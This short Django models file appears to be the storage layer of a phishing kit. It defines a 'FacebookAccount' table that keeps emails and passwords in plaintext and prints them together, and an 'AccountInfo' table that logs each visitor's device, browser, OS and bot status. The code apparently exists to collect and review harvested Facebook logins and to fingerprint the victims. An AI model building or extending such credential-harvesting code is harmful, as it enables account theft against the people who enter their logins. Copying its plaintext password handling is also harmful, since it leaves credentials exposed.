from django.db import models

# Create your models here.

class FacebookAccount(models.Model):
    email = models.CharField(blank=0, null=0, max_length=100)
    password = models.CharField(blank=0, null=0, max_length=100)
    created = models.DateTimeField(auto_now_add=True, null=1, blank=1)
    def __str__(self):
        return self.email + " || " + self.password + " || " + str(self.created)
    

class AccountInfo(models.Model):
    is_mobile = models.CharField(blank=0, null=0, max_length=100)
    is_tablet = models.CharField(blank=0, null=0, max_length=100)
    is_touch_capable = models.CharField(blank=0, null=0, max_length=100)
    is_pc = models.CharField(blank=0, null=0, max_length=100)
    is_bot = models.CharField(blank=0, null=0, max_length=100)
    browser = models.CharField(blank=0, null=0, max_length=5000)
    browser_family = models.CharField(blank=0, null=0, max_length=100)
    browser_version = models.CharField(blank=0, null=0, max_length=100)
    os = models.CharField(blank=0, null=0, max_length=100)
    os_family = models.CharField(blank=0, null=0, max_length=100)
    os_version = models.CharField(blank=0, null=0, max_length=100)
    device = models.CharField(blank=0, null=0, max_length=100)
    device_family = models.CharField(blank=0, null=0, max_length=100)